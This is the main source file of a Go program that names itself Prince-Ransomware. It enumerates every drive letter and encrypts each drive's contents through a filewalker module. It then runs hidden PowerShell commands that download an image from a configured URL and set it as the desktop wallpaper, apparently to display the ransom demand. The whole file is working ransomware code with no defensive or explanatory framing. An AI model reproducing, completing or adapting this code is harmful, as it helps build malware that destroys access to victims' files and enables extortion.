package main

import (
	Configuration "Prince-Ransomware/configuration"
	"Prince-Ransomware/filewalker"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func main() {
	for _, drive := range getDrives() {
		filewalker.EncryptDirectory(drive + ":")
	}

	setWallpaper()
}

func setWallpaper() {
	filePath := filepath.Join(os.Getenv("TEMP"), "Wallpaper.png")

	// PowerShell command to download the image
	downloadCmd := exec.Command("powershell", "-Command", `(New-Object System.Net.WebClient).DownloadFile('`+Configuration.WallpaperURL+`', '`+filePath+`')`)
	downloadCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := downloadCmd.Run()
	if err != nil {
		return
	}

	// PowerShell command to set the wallpaper
	setWallpaperCmd := exec.Command("powershell", "-Command", `Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport("user32.dll", CharSet = CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); public static void Set(string path) { SystemParametersInfo(20, 0, path, 3); } }'; [Wallpaper]::Set('`+filePath+`')`)
	setWallpaperCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = setWallpaperCmd.Run()
	if err != nil {
		return
	}
}

func getDrives() (r []string) {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":")
		if err == nil {
			r = append(r, string(drive))
			f.Close()
		}
	}

	return
}
